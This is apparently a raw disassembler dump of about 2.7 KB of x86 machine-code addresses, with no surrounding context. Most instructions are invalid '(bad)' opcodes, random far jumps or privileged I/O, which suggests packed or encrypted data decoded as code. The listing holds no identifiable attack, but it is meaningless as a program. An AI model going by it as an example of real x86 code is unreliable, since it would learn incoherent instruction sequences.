  424c0c:	xchg   eax,ebp
  424c0e:	call   0x59e:0x8afae20a
  424c15:	lods   al,BYTE PTR ds:[esi]
  424c16:	mov    edx,0xf77f7fca
  424c1b:	test   BYTE PTR [esi],0xd2
  424c1e:	jns    0x424bcb
  424c20:	push   esi
  424c21:	sbb    bl,al
  424c23:	daa    
  424c24:	jae    0x424c6a
  424c26:	push   edi
  424c27:	sbb    al,0x4
  424c29:	dec    ebp
  424c2a:	arpl   WORD PTR [ecx+esi*4],bx
  424c2d:	mov    cl,bl
  424c2f:	cmp    ch,BYTE PTR [ebx-0x12]
  424c32:	bound  esp,QWORD PTR [eax+0xdda9d31]
  424c38:	sbb    al,0x27
  424c3a:	aaa    
  424c3b:	test   al,0x18
  424c3d:	enter  0x27bc,0x19
  424c41:	mov    cl,0xc3
  424c43:	fld    TBYTE PTR [edi+ebp*8]
  424c46:	fwait
  424c47:	pusha  
  424c48:	mov    edx,0xbb6a0c5e
  424c4d:	add    al,BYTE PTR [ecx]
  424c4f:	cmp    eax,0xb59a5d1
  424c54:	arpl   WORD PTR [ebx+0x39],cx
  424c57:	dec    ebp
  424c58:	xchg   DWORD PTR ds:0x20b42ebd,eax
  424c5e:	push   eax
  424c5f:	stos   DWORD PTR es:[edi],eax
  424c60:	dec    ecx
  424c61:	cmp    ebp,ebx
  424c63:	push   ebx
  424c64:	rcr    DWORD PTR [ebp-0x42],1
  424c67:	ss add DWORD PTR ds:[ebx+edx*1],esp
  424c6c:	pop    ebx
  424c6d:	sbb    DWORD PTR [edx-0x2],edi
  424c70:	aad    0x55
  424c72:	sub    DWORD PTR [eax-0x7831998d],edi
  424c78:	push   ds
  424c79:	cmp    DWORD PTR [eax+0x607ce71a],ebx
  424c7f:	jmp    0x424cf3
  424c81:	mov    esi,0x82ce7b63
  424c86:	sub    al,0x49
  424c88:	shl    DWORD PTR [edi+0x76],1
  424c8b:	fstp   QWORD PTR [ebx]
  424c8d:	mov    ds,WORD PTR [esi-0x20]
  424c90:	rol    BYTE PTR [esp+eiz*2+0x461dd9e5],1
  424c97:	add    al,0xd1
  424c99:	cwde   
  424c9a:	(bad)  
  424c9b:	push   0x31
  424c9d:	ficomp WORD PTR [edx+0x5d9e346b]
  424ca3:	sbb    ebx,ebx
  424ca5:	dec    esi
  424ca6:	aam    0x38
  424ca8:	retf   
  424ca9:	sbb    BYTE PTR [edx+ebx*8],cl
  424cac:	xchg   ecx,eax
  424cad:	push   ebx
  424cae:	sbb    eax,DWORD PTR [edx]
  424cb0:	jns    0x424cbe
  424cb2:	xor    DWORD PTR [ebx-0x4f],edi
  424cb5:	push   ds
  424cb6:	jmp    0xafde87ce
  424cbb:	pop    ds
  424cbc:	xchg   edi,eax
  424cbd:	rcl    BYTE PTR [eax+0xd7dbb20],cl
  424cc3:	xor    ebp,DWORD PTR [eax+0x60]
  424cc6:	jmp    0x72bdd177
  424ccb:	cmp    esp,DWORD PTR [eax+0x474d848b]
  424cd1:	or     eax,0x93ca1876
  424cd6:	push   esp
  424cd7:	add    cl,al
  424cd9:	inc    ebp
  424cda:	test   BYTE PTR [edi],cl
  424cdc:	xchg   edx,eax
  424cdd:	sub    DWORD PTR [ecx-0x17b91853],esi
  424ce3:	jb     0x424cb4
  424ce5:	test   DWORD PTR [ecx-0x436fb71b],edx
  424ceb:	pusha  
  424cec:	cmp    cl,0x0
	...
  424d53:	add    BYTE PTR [eax],al
  424d55:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424d59:	push   0xffffffb6
  424d5b:	outs   dx,BYTE PTR ds:[esi]
  424d5c:	(bad)  
  424d5d:	fisub  WORD PTR [edx-0x65]
  424d60:	test   al,0x51
  424d62:	dec    edi
  424d63:	int3   
  424d64:	rol    dl,1
  424d66:	mov    eax,DWORD PTR [bx+di]
  424d69:	add    BYTE PTR [eax],al
  424d6b:	add    DWORD PTR [eax],eax
  424d6d:	add    BYTE PTR [ecx+0x2e],cl
  424d70:	fucomp st(4)
  424d72:	(bad)
  424d77:	leave  
  424d78:	mov    ch,al
  424d7a:	sbb    ch,BYTE PTR [ebx]
  424d7c:	stc    
  424d7d:	lea    eax,[esi-0x794f2c65]
  424d83:	leave  
  424d84:	cmp    esi,DWORD PTR [ecx-0x75f1a398]
  424d8a:	mov    DWORD PTR [edi-0x57015238],ecx
  424d90:	and    BYTE PTR [edi+0x14ecd18a],dl
  424d96:	inc    ecx
  424d97:	daa    
  424d98:	push   0x6a
  424d9a:	outs   dx,DWORD PTR ds:[esi]
  424d9b:	jecxz  0x424e05
  424d9d:	or     ebx,DWORD PTR [edx-0x3ff9e9a3]
  424da3:	adc    BYTE PTR [eax],dl
  424da5:	push   edi
  424da6:	lahf   
  424da7:	sbb    al,0x6b
  424da9:	fsubr  st,st(0)
  424dab:	adc    eax,0x67b16870
  424db0:	pop    es
  424db1:	push   0x55
  424db3:	mov    ch,0x31
  424db5:	mov    al,es:0x68bfd491
  424dbb:	and    edi,DWORD PTR [edx]
  424dbd:	pop    edx
  424dbe:	ss xchg ebp,eax
  424dc0:	scas   eax,DWORD PTR es:[edi]
  424dc1:	mov    ah,0xec
  424dc3:	cdq    
  424dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424dc5:	loop   0x424d9f
  424dc7:	inc    eax
  424dc8:	pop    esp
  424dc9:	loope  0x424d69
  424dcb:	pop    edx
  424dcc:	mov    BYTE PTR [edi+eax*8-0x3f],ah
  424dd0:	or     eax,0x851f58d0
  424dd5:	ret    0x89ef
  424dd8:	(bad)  
  424dd9:	cmp    edi,ebx
  424ddb:	dec    esi
  424ddc:	sbb    dh,0x56
  424ddf:	retf   
  424de0:	jmp    0x424dc0
  424de2:	sub    BYTE PTR [edx],dl
  424de4:	mov    al,es:0xf4f48a7c
  424dea:	fsubr  DWORD PTR [ecx-0x610c0f7d]
  424df0:	dec    eax
  424df1:	mov    ecx,0x7ea9581d
  424df6:	js     0x424e3c
  424df8:	sbb    DWORD PTR [esi+0x6f02b358],0xffffffdc
  424dff:	fst    DWORD PTR [edi]
  424e01:	(bad)  
  424e02:	push   esp
  424e03:	stos   BYTE PTR es:[edi],al
  424e04:	push   ds
  424e05:	xchg   edi,eax
  424e06:	adc    edx,ebx
  424e08:	ret    0x6936
  424e0b:	pusha  
  424e0c:	in     al,dx
  424e0d:	dec    ebx
  424e0e:	outs   dx,BYTE PTR ds:[esi]
  424e0f:	xchg   esp,eax
  424e10:	dec    esi
  424e11:	(bad)  
  424e13:	add    edi,DWORD PTR ds:0x93309301
  424e19:	sub    ch,ah
  424e1b:	mov    ?,WORD PTR [eax+0x325ed260]
  424e21:	es ret 0xfa61
  424e25:	push   ebp
  424e26:	loope  0x424e13
  424e28:	dec    ebp
  424e29:	xchg   edx,eax
  424e2a:	dec    esi
  424e2b:	lock aas 
  424e2d:	cs clc 
  424e2f:	pop    ds
  424e30:	push   ebp
  424e31:	mov    esp,0x1577ff74
  424e36:	inc    eax
  424e37:	por    mm2,QWORD PTR [ebp-0x28]
  424e3b:	sbb    al,0x44
  424e3d:	loope  0x424e42
  424e3f:	mov    al,ds:0xd150d9b7
  424e44:	dec    ecx
  424e45:	mov    esp,0x8159a236
  424e4a:	pop    edi
  424e4b:	out    0xe8,al
  424e4d:	in     eax,dx
  424e4e:	mov    ebx,DWORD PTR [edx]
  424e50:	mov    ds:0x74d57bfb,al
  424e55:	dec    esp
  424e56:	stos   BYTE PTR es:[edi],al
  424e57:	inc    esi
  424e58:	sbb    al,0x9a
  424e5a:	cmp    ah,dl
  424e5c:	push   0xcc244320
  424e61:	adc    ecx,edi
  424e63:	test   BYTE PTR [esi],ah
  424e65:	xchg   ecx,eax
  424e66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e67:	mov    bh,0x92
  424e69:	std    
  424e6a:	leave  
  424e6b:	retf   0x52f4
	...
  424ed6:	cmp    eax,0xf361d20c
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424ed0
  424ee3:	and    eax,0x8c67ce09
  424ee8:	add    DWORD PTR [eax],eax
  424eea:	add    BYTE PTR [ecx],al
  424eec:	add    BYTE PTR [eax],al
  424eee:	pop    ecx
  424eef:	push   esp
  424ef0:	test   bh,ch
  424ef2:	test   al,0x65
  424ef4:	sbb    al,0x1c
  424ef6:	add    BYTE PTR [ebx+0x39],bh
  424ef9:	mov    ds:0xc9ac1cea,eax
  424efe:	mov    ebp,eax
  424f00:	neg    DWORD PTR [edi+0x38983c4e]
  424f06:	repnz out dx,al
  424f08:	pop    ecx
  424f09:	push   edx
  424f0a:	xor    esp,DWORD PTR [eax]
  424f0c:	jno    0x424ef8
  424f0e:	xchg   ebp,eax
  424f0f:	or     al,0x55
  424f11:	inc    esp
  424f12:	test   eax,0x30106ad2
  424f17:	(bad)  
  424f18:	mov    cl,ch
  424f1a:	dec    ebp
  424f1b:	pop    ebx
  424f1c:	(bad)  
  424f1d:	dec    edi
  424f1e:	das    
  424f1f:	mov    esi,0xaf8e778f
  424f24:	dec    edx
  424f25:	mov    ds:0x90094624,al
  424f2a:	add    dh,ch
  424f2c:	test   eax,0xb0b0acdb
  424f31:	pop    esi
  424f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f33:	sbb    al,0xe5
  424f35:	jmp    0x89e1:0x845164f
  424f3c:	push   eax
  424f3d:	aam    0x8b
  424f3f:	out    dx,eax
  424f40:	shr    bl,0x30
  424f43:	rol    DWORD PTR [eax-0x6d],0x4
  424f47:	ss cs test eax,0xc685b939
  424f4e:	fistp  DWORD PTR [ecx]
  424f50:	les    ecx,FWORD PTR [edx+0x1c8094bd]
  424f56:	shr    BYTE PTR [eax+0x39],1
  424f59:	es and esi,0xbd228346
  424f60:	and    BYTE PTR ss:[ecx+0x22e74cd0],ch
  424f67:	mov    edx,DWORD PTR [edx+0x24]
  424f6a:	lods   eax,DWORD PTR ds:[esi]
  424f6b:	sub    DWORD PTR [edx],0xffffffa9
  424f6e:	adc    al,dh
  424f70:	push   es
  424f71:	in     eax,dx
  424f72:	ja     0x424fdc
  424f74:	(bad)  
  424f75:	and    eax,0xdabb0073
  424f7a:	sub    dh,BYTE PTR [ebp-0x76]
  424f7d:	cmp    eax,0xe72c6240
  424f82:	dec    edi
  424f83:	and    al,0x7b
  424f85:	push   es
  424f86:	out    dx,eax
  424f87:	stos   BYTE PTR es:[edi],al
  424f88:	jl     0x424f94
  424f8a:	xchg   ebp,eax
  424f8b:	test   al,0x96
  424f8d:	add    ecx,esp
  424f8f:	mov    ds:0x174f2365,eax
  424f94:	jge    0x424f8d
  424f96:	cs cdq 
  424f98:	lahf   
  424f99:	fwait
  424f9a:	neg    DWORD PTR [ecx+ecx*8]
  424f9d:	pop    edi
  424f9e:	es pop esi
  424fa0:	pop    esi
  424fa1:	sar    DWORD PTR [edx+0x70],0xc
  424fa5:	dec    edx
  424fa6:	mul    DWORD PTR [esp+ebp*1+0x25ba860f]
  424fad:	add    BYTE PTR [ecx],0x71
  424fb0:	repnz loop 0x425028
  424fb3:	std    
  424fb4:	xor    eax,0xb83c5b4c
  424fb9:	outs   dx,DWORD PTR ds:[esi]
  424fba:	mov    ch,0x1b
  424fbc:	mov    DWORD PTR [eax+eiz*8],esp
  424fbf:	ror    bh,0x83
  424fc2:	(bad)  
  424fc3:	pop    ds
  424fc4:	cmp    DWORD PTR [edx-0x36],esp
  424fc7:	lock call 0x8028:0x5a644b77
  424fcf:	imul   ebx,esp,0x3a03f895
  424fd5:	xchg   edx,eax
  424fd6:	pop    esp
  424fd7:	shl    BYTE PTR [ebx-0x75],cl
  424fda:	loopne 0x424f65
  424fdc:	ins    DWORD PTR es:[edi],dx
  424fdd:	jge    0x425008
  424fdf:	sahf   
  424fe0:	pop    edi
  424fe1:	dec    ecx
  424fe2:	fnsave [ebx]
  424fe4:	nop
  424fe5:	push   es
  424fe6:	push   esi
  424fe7:	add    DWORD PTR [edi],esi
  424fe9:	xchg   ebx,eax
  424fea:	dec    ecx
  424feb:	pusha  
  424fec:	outs   dx,DWORD PTR ds:[esi]
  424fed:	stos   BYTE PTR es:[edi],al
	...
  425056:	dec    ebx
  425057:	push   ss
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	out    dx,al
  425063:	inc    ebp
  425064:	pmulhuw mm4,QWORD PTR [edi-0x73]
  425068:	add    DWORD PTR [eax],eax
  42506a:	add    BYTE PTR [ecx],al
  42506c:	add    BYTE PTR [eax],al
  42506e:	(bad)  
  42506f:	mov    esp,0x1a355442
  425074:	outs   dx,BYTE PTR ds:[esi]
  425075:	sbb    eax,0x6f5951d6
  42507a:	jno    0x42507b
  42507c:	adc    ebx,DWORD PTR [ebp+0x33037716]
  425082:	imul   ecx,ebp,0x4ff89f9d
  425088:	push   eax
  425089:	repnz push 0x46
  42508c:	xor    BYTE PTR [esi+0x37],dl
  42508f:	les    esi,FWORD PTR [ebx-0x2f]
  425092:	add    al,0x8
  425094:	xchg   DWORD PTR [eax-0x2],eax
  425097:	mov    ecx,0x33d5d60f
  42509c:	push   es
  42509d:	and    eax,0xa4e9ff94
  4250a2:	in     eax,0x22
  4250a4:	jp     0x4250b9
  4250a6:	mov    cl,0x8c
  4250a8:	leave  
  4250a9:	xor    DWORD PTR [edx-0x2c],edi
  4250ac:	dec    ecx
  4250ad:	in     eax,0xed
  4250af:	inc    edi
  4250b0:	xor    al,0xf4
  4250b2:	add    eax,0x32d0515d
  4250b7:	pop    DWORD PTR [eax-0x42b9220a]
  4250bd:	(bad)  
  4250bf:	test   BYTE PTR [edx+0x1],bh
  4250c2:	bound  esp,QWORD PTR [eax+eiz*4-0x6b810883]
  4250c9:	xlat   BYTE PTR ds:[ebx]
  4250ca:	or     dl,BYTE PTR [ebp-0x37]
  4250cd:	jl     0x42506f
  4250cf:	js     0x42514c
  4250d1:	adc    al,bh
  4250d3:	pop    es
  4250d4:	inc    edx
  4250d5:	dec    ebp
  4250d6:	and    ch,ah
  4250d8:	int    0xf
  4250da:	mov    edi,DWORD PTR [esi*8+0x4b025502]
  4250e1:	mov    edx,0xb37af3c9
  4250e6:	std    
  4250e7:	mov    ds:0x72087a,eax
  4250ec:	hlt    
  4250ed:	out    dx,al
  4250ee:	outs   dx,BYTE PTR ds:[esi]
  4250ef:	shr    edx,1
  4250f1:	lahf   
  4250f2:	rcl    DWORD PTR gs:[ebp-0x66],cl
  4250f6:	jno    0x4250bb
  4250f8:	sahf   
  4250f9:	cmp    DWORD PTR [ebp+0x56301852],ebp
  4250ff:	arpl   WORD PTR [esi],bp
  425101:	scas   al,BYTE PTR es:[edi]
  425102:	mov    ds:0x1b70294b,al
  425107:	les    ebx,FWORD PTR [ecx+edi*4-0xedad527]
  42510e:	push   0xfd7aca97
  425113:	mov    ds:0xb0298639,al
  425118:	dec    esp
  425119:	and    edx,DWORD PTR [ebx+ebp*8]
  42511c:	fwait
  42511d:	sbb    DWORD PTR ds:0x22b04513,ecx
  425123:	(bad)  
  425124:	enter  0x5680,0x20
  425128:	test   BYTE PTR [ebp-0x79bda5e],ah
  42512e:	ror    DWORD PTR [esi+0x2b8540ea],0x77
  425135:	and    al,0xca
  425137:	fs aad 0xf1
  42513a:	inc    ecx
  42513b:	mov    ebp,DWORD PTR [ebx-0x4e]
  42513e:	inc    DWORD PTR [edx-0x44]
  425141:	xchg   DWORD PTR [ebx],ecx
  425143:	or     eax,DWORD PTR [edi+0x44]
  425146:	mov    eax,ds:0x35d0bc64
  42514b:	and    ebp,eax
  42514d:	xor    DWORD PTR [edi],esi
  42514f:	test   eax,0x20e24676
  425154:	adc    eax,0x8199c19f
  425159:	add    al,0x19
  42515b:	push   eax
  42515c:	stos   DWORD PTR es:[edi],eax
  42515d:	jb     0x425105
  42515f:	shl    edx,1
  425161:	stc    
  425162:	add    eax,0xb9b0751c
  425167:	shl    BYTE PTR [edi-0x2111b69a],cl
  42516d:	rol    BYTE PTR [eax],cl
	...
  4251d3:	add    BYTE PTR [eax],al
  4251d5:	add    dh,bl
  4251d7:	adc    DWORD PTR [edi-0x15020dd],ebx
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0x5d9d:0x4dd192e8
  4251e6:	mov    es,WORD PTR [bx+di]
  4251e9:	add    BYTE PTR [eax],al
  4251eb:	add    DWORD PTR [eax],eax
  4251ed:	add    BYTE PTR [ecx],ah
  4251ef:	and    bh,BYTE PTR [ebx+edi*2]
  4251f2:	jle    0x42524c
  4251f4:	jne    0x425236
  4251f6:	inc    edx
  4251f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251f8:	jo     0x425220
  4251fa:	fistp  DWORD PTR [ecx+0x44]
  4251fd:	clc    
  4251fe:	or     DWORD PTR [edx-0x76],edi
  425201:	add    BYTE PTR [ecx],cl
  425203:	cmp    esi,DWORD PTR [edx+0x27]
  425206:	or     DWORD PTR [ecx+0x7468b8a3],edi
  42520c:	fs add eax,0x9a64c31
  425212:	cmp    DWORD PTR [ecx],eax
  425214:	call   DWORD PTR [ebx]
  425216:	lods   eax,DWORD PTR ds:[esi]
  425217:	and    BYTE PTR [edi+0x586af574],cl
  42521d:	and    eax,0x6eb2056b
  425222:	inc    ebp
  425223:	add    al,BYTE PTR [edx+0x64abd14d]
  425229:	int    0x5e
  42522b:	stos   DWORD PTR es:[edi],eax
  42522c:	pushf  
  42522d:	mov    edx,0x499b62cd
  425232:	cld    
  425233:	mov    DWORD PTR [edi-0x56],esp
  425236:	push   edx
  425237:	fcom   DWORD PTR [ecx]
  425239:	pop    esp
  42523a:	xchg   edi,eax
  42523b:	and    DWORD PTR [edi-0x4b],ebx
  42523e:	lock fwait
  425240:	mov    bh,0x62
  425242:	clc    
  425243:	lods   al,BYTE PTR ds:[esi]
  425244:	cmp    DWORD PTR [eax],edx
  425246:	push   esi
  425247:	es clc 
  425249:	test   BYTE PTR [esi+esi*1],bh
  42524c:	add    DWORD PTR [ebp-0x74],0xedaebbac
  425253:	mov    esi,ss
  425255:	and    eax,0xe362e37b
  42525a:	daa    
  42525b:	xchg   BYTE PTR [eax+0x4f],ah
  42525e:	cwde   
  42525f:	xor    eax,0xacbf220f
  425264:	fidiv  DWORD PTR [edx+edx*2-0x10]
  425268:	lock icebp 
  42526a:	sahf   
  42526b:	(bad)  
  42526d:	push   ebx
  42526e:	and    bl,BYTE PTR [esp+eax*8-0x6579ceb0]
  425275:	or     edi,edi
  425277:	hlt    
  425278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425279:	dec    esi
  42527a:	dec    BYTE PTR [ebp-0xe]
  42527d:	sbb    ch,BYTE PTR [edi-0x6d44bb0f]
  425283:	xchg   ebp,eax
  425284:	push   esp
  425285:	(bad)  
  425286:	pmullw mm0,QWORD PTR [eax]
  425289:	out    0xb5,eax
  42528b:	add    BYTE PTR [edi],ch
  42528d:	iret   
  42528e:	mov    eax,ds:0xedb7d48e
  425293:	rcl    DWORD PTR [esi+ebp*4+0x48],0x32
  425298:	int3   
  425299:	popf   
  42529a:	push   esp
  42529b:	lds    esi,FWORD PTR [ecx+eax*4]
  42529e:	pop    esi
  42529f:	mov    ecx,0xd9550730
  4252a4:	stos   BYTE PTR es:[edi],al
  4252a5:	dec    edx
  4252a6:	(bad)  
  4252a7:	mov    edx,0xd2cf3422
  4252ac:	(bad)  
  4252ad:	cmp    al,0xbb
  4252af:	pop    esi
  4252b0:	mov    ?,WORD PTR [eax+0x19211ab9]
  4252b6:	and    eax,0xcbc6d805
  4252bb:	cdq    
  4252bc:	(bad)  
  4252bd:	cmc    
  4252be:	ja     0x4252ac
  4252c0:	lods   al,BYTE PTR ds:[esi]
  4252c1:	bound  esi,QWORD PTR [esi-0x6ef28180]
  4252c7:	and    BYTE PTR [ebx-0x60f3dc16],bh
  4252cd:	lods   al,BYTE PTR ds:[esi]
  4252ce:	loop   0x425266
  4252d0:	push   ecx
  4252d1:	push   edx
  4252d2:	and    BYTE PTR [ecx-0x8],ah
  4252d5:	add    esp,DWORD PTR [edx+eiz*1+0x2]
  4252d9:	(bad)  
  4252da:	mov    BYTE PTR [ecx-0x39],dh
  4252dd:	adc    WORD PTR [esi],bp
  4252e0:	or     ebx,ebp
  4252e2:	add    ecx,0x33
  4252e5:	out    0xbb,al
  4252e7:	add    eax,0x36064339
  4252ec:	daa    
  4252ed:	mov    ah,0x0
	...
  425353:	add    BYTE PTR [eax],al
  425355:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	dec    ecx
  425363:	xchg   ebp,eax
  425364:	jae    0x4253c6
  425366:	pop    DWORD PTR [bx+di]
  425369:	add    BYTE PTR [eax],al
  42536b:	add    DWORD PTR [eax],eax
  42536d:	add    BYTE PTR [esi+0x7d9b2aa5],bh
  425373:	stos   DWORD PTR es:[edi],eax
  425374:	add    bl,BYTE PTR [ebx]
  425376:	jmp    0x42537b
  425378:	outs   dx,BYTE PTR ds:[esi]
  425379:	fs xchg edi,eax
  42537b:	div    BYTE PTR [ecx+0x32]
  42537e:	sbb    eax,0xe67540fa
  425383:	mov    cl,0xa9
  425385:	add    bl,bh
  425387:	add    BYTE PTR [esi],bh
  425389:	cli    
  42538a:	ins    BYTE PTR es:[edi],dx
  42538b:	outs   dx,DWORD PTR ds:[esi]
  42538c:	adc    eax,0xef9c2cc9
  425391:	into   
  425392:	fwait
  425393:	mov    eax,ds:0x5b181cc3
  425398:	ss into 
  42539a:	and    eax,0xebac5120
  42539f:	sub    eax,0x5091dabf
  4253a4:	aam    0x38
  4253a6:	or     BYTE PTR [ebx],0x16
  4253a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253aa:	xchg   edi,eax
  4253ab:	jb     0x425424
  4253ad:	jle    0x4253be
  4253af:	mov    esp,0x70a9e9e9
  4253b4:	fisub  DWORD PTR [ebx+0x19607f10]
  4253ba:	pop    es
  4253bb:	jmp    0x5c429fb0
  4253c0:	call   0xb1d:0x74c114c9
  4253c7:	bound  ebp,QWORD PTR [ebp-0x73]
  4253ca:	push   0x64aac1a6
  4253cf:	inc    esi
  4253d0:	dec    esp
  4253d1:	inc    ebx
  4253d2:	lods   al,BYTE PTR ds:[esi]
  4253d3:	sar    ah,1
  4253d5:	arpl   WORD PTR [esi-0x676dfe0],cx
  4253db:	mov    al,cs:0x3cfd5da0
  4253e1:	or     esp,0x7377d11f
  4253e7:	ins    DWORD PTR es:[edi],dx
  4253e8:	push   ebp
  4253e9:	mov    al,0x8c
  4253eb:	mov    ch,0xf
  4253ed:	daa    
  4253ee:	cmc    
  4253ef:	fistp  DWORD PTR [ecx-0x30]
  4253f2:	fld    TBYTE PTR [eax]
  4253f4:	aas    
  4253f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253f6:	inc    eax
  4253f7:	jp     0x425455
  4253f9:	ret    0xd602
  4253fc:	(bad)  
  4253fd:	or     eax,0xbbaf68fe
  425402:	iret   
  425403:	xchg   ecx,esi
  425405:	mov    al,0x37
  425407:	jmp    0x9601558f
  42540c:	aad    0xe0
  42540e:	dec    BYTE PTR ds:0x3831cfeb
  425414:	adc    bh,ch
  425416:	enter  0x9956,0xce
  42541a:	xor    eax,0x1fdeb448
  42541f:	test   al,0xfb
  425421:	lods   al,BYTE PTR ds:[esi]
  425422:	fiadd  WORD PTR [ecx-0x46]
  425425:	pusha  
  425426:	mov    eax,0x6a9ea454
  42542b:	cmp    cl,dl
  42542d:	sar    DWORD PTR [eax-0x42],0xc3
  425431:	jae    0x4253c5
  425433:	sar    BYTE PTR [ecx+0x54eb3ced],1
  425439:	or     ch,bl
  42543b:	mov    ch,0x0
  42543d:	data16 xor al,0x33
  425440:	scas   eax,DWORD PTR es:[edi]
  425441:	jmp    0xd7c4:0x9fd59acf
  425448:	xchg   edx,eax
  425449:	jg     0x4253d2
  42544b:	dec    ebx
  42544c:	js     0x4253db
  42544e:	int    0xbe
  425450:	push   DWORD PTR [edx]
  425452:	int3   
  425453:	cmp    edx,DWORD PTR [ebp+0x5b]
  425456:	push   ebx
  425457:	and    eax,0x308f332b
  42545c:	mov    ch,0xa1
  42545e:	xchg   edx,eax
  42545f:	out    dx,eax
  425460:	ins    BYTE PTR es:[edi],dx
  425461:	mov    cl,0xc2
  425463:	add    eax,0x3c5413c2
  425468:	mov    eax,ds:0x16a8362
  42546d:	test   BYTE PTR [eax],0x0
	...
  4254d4:	add    BYTE PTR [eax],al
  4254d6:	inc    edx
  4254d7:	or     esp,eax
  4254d9:	test   eax,0xeb6fedcf
  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    edx,DWORD PTR [edi]
  4254e3:	in     al,0x32
  4254e5:	addr16 pause 
  4254e8:	add    DWORD PTR [eax],eax
  4254ea:	add    BYTE PTR [ecx],al
  4254ec:	add    BYTE PTR [eax],al
  4254ee:	shl    ah,1
  4254f0:	sub    al,0x3b
  4254f2:	adc    BYTE PTR [eax+0x31],bl
  4254f5:	jmp    0x260deef1
  4254fa:	mov    ah,0x64
  4254fc:	xor    cl,BYTE PTR [edi]
  4254fe:	aad    0x89
  425500:	in     eax,0xe4
  425502:	loope  0x42556b
  425504:	jae    0x4254df
  425506:	imul   esp,DWORD PTR [eax-0x42333082],0x87b864dd
  425510:	loopne 0x4254e2
  425512:	push   0xffffffb3
  425514:	repz or BYTE PTR [eax],0x5
  425518:	or     eax,0xe8608206
  42551d:	(bad)  
  42551e:	rcr    DWORD PTR [edi+ebp*8-0x7efc1f28],0xa0
  425526:	jne    0x425557
  425528:	xor    al,0x5e
  42552a:	(bad)  
  42552b:	addr16 (bad) 
  42552d:	ins    BYTE PTR es:[edi],dx
  42552e:	fsubr  QWORD PTR [esi]
  425530:	push   eax
  425531:	xchg   edi,eax
  425532:	jae    0x42552a
  425534:	gs retf 0x8dd3
  425538:	scas   al,BYTE PTR es:[edi]
  425539:	push   cs
  42553a:	data16 cmp dl,BYTE PTR [ebx+0x431d0362]
  425541:	ret    0x10d0
  425544:	mov    esp,0xed88bc87
  425549:	xlat   BYTE PTR ds:[ebx]
  42554a:	mov    ah,0xad
  42554c:	jnp    0x42554f
  42554e:	ror    DWORD PTR [eax],0xc
  425551:	daa    
  425552:	inc    ebp
  425553:	push   esi
  425554:	cmp    al,0x26
  425556:	cld    
  425557:	(bad)  [edx+0x2c148689]
  42555d:	mov    esp,0x42959ffc
  425562:	jle    0x42558e
  425564:	xrelease mov BYTE PTR [ebx+0x997a57],dl
  42556b:	in     al,dx
  42556c:	daa    
  42556d:	sub    eax,0x6fdd5996
  425572:	das    
  425573:	sub    BYTE PTR [esi-0x774529b6],ah
  425579:	(bad)  
  42557a:	daa    
  42557b:	ds das 
  42557d:	mov    dl,0x39
  42557f:	sbb    BYTE PTR [edi],bl
  425581:	pushf  
  425582:	adc    eax,DWORD PTR [ebx+0x3f2b0039]
  425588:	loope  0x425572
  42558a:	addr16 hlt 
  42558c:	adc    eax,0xcb10200a
  425591:	cmp    al,0x24
  425593:	outs   dx,DWORD PTR ds:[esi]
  425594:	js     0x4255a4
  425596:	inc    edx
  425597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425598:	pop    ds
  425599:	fistp  WORD PTR [ebp-0x16]
  42559c:	inc    ecx
  42559d:	push   ss
  42559e:	imul   esi,DWORD PTR [ecx-0x60],0x38
  4255a2:	ret    0x2724
  4255a5:	lahf   
  4255a6:	push   esi
  4255a7:	test   eax,0x373caf6b
  4255ac:	jmp    0xc44b:0x8bde2783
  4255b3:	pop    es
  4255b4:	fs inc ebp
  4255b6:	and    DWORD PTR [ebx-0x5c0bcd4d],esi
  4255bc:	add    eax,0x702abbdc
  4255c1:	xor    BYTE PTR [esi-0x6f67944f],0x84
  4255c8:	pusha  
  4255c9:	dec    esi
  4255ca:	pop    edx
  4255cb:	aad    0x7
  4255cd:	pop    ebp
  4255ce:	bound  eax,QWORD PTR [ebp+0x67fedfff]
  4255d4:	dec    ecx
  4255d5:	sub    ch,al
  4255d7:	mov    DWORD PTR [ecx+ebx*4],ecx
  4255da:	cwde   
  4255db:	jg     0x4255d5
  4255dd:	xor    bh,ch
  4255df:	mov    bh,0x1f
  4255e1:	outs   dx,BYTE PTR ds:[esi]
  4255e2:	add    eax,0x158cb53a
  4255e7:	inc    ebx
  4255e8:	(bad)  
  4255e9:	and    al,0xcb
  4255eb:	jo     0x4255e3
  4255ed:	add    BYTE PTR fs:[eax],al
	...
  425654:	add    BYTE PTR [eax],al
  425656:	(bad)  
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0x3a94f13a
  425664:	push   es
  425665:	(bad)  
  425666:	addr16 xchg ecx,eax
  425668:	add    DWORD PTR [eax],eax
  42566a:	add    BYTE PTR [ecx],al
  42566c:	add    BYTE PTR [eax],al
  42566e:	dec    edi
  42566f:	shl    DWORD PTR [edi-0x7a9f8865],cl
  425675:	mov    esp,0x89fa1c6
  42567a:	jno    0x42569b
  42567c:	aam    0xef
  42567e:	imul   eax,DWORD PTR [edx-0x78],0xb
  425682:	ret    0x4656
  425685:	add    DWORD PTR ds:0x6d1865c9,ebx
  42568b:	and    eax,0x805fffa6
  425690:	and    ecx,eax
  425692:	pushf  
  425693:	aas    
  425694:	or     BYTE PTR [esi-0x75904999],dl
  42569a:	jmp    0xf815:0x1553f3ee
  4256a1:	push   esp
  4256a2:	icebp  
  4256a3:	icebp  
  4256a4:	aam    0xaa
  4256a6:	adc    edx,ebx
  4256a8:	sub    eax,ebx
